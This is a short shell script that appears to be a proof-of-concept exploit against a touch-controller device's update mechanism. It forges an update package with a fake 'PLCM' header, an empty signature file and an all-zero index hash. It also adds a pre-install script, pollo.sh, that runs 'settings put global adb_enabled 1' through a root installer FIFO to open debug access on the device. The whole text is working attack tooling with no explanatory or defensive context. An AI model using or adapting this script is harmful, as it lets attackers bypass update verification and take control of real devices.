set -ex

function make_plcm() {
    echo "PLCM.V1.00" > $2
    cat /dev/zero | head -c512 >> $2
    cat $1 >> $2
}

rm -rf tmp/ vega/

mkdir tmp
mkdir -p vega/platform/current/vega
mkdir -p vega/pool

echo platform > vega/info.txt

touch vega/platform/current/release.sig

cat >vega/platform/current/release.txt <<EOF
Product: vega
DisplayName: Touch controller software package
Version: 2.2.2.8
VersionSuffix: 
BuildNumber: 1337
ProjectPhase: release
HwModels: VEGA=vega
PackageIndexSHA1: 0000000000000000000000000000000000000000
EOF

cat >tmp/pollo.sh <<EOF
settings put global adb_enabled 1
echo 1
exit 1
EOF

tar cvf tmp/pollo.sh.tar -C tmp/ pollo.sh
make_plcm tmp/pollo.sh.tar vega/pool/pollo.sh.plcm

cat >vega/platform/current/vega/packages.txt <<EOF
Package: pollo
Filename: pollo.sh.plcm
Size: 0
SHA1: $(sha1sum vega/pool/pollo.sh.plcm | cut -d' ' -f1)
Version: 2.2.2.8
VersionSuffix: 
BuildNumber: 1337
Type: EXTERNAL
group: PRE_INSTALL
DestErase: FALSE
DestEraseFR: FALSE
Installer: pollo.sh
FIFO: /tmp/su_installer.fifo

EOF
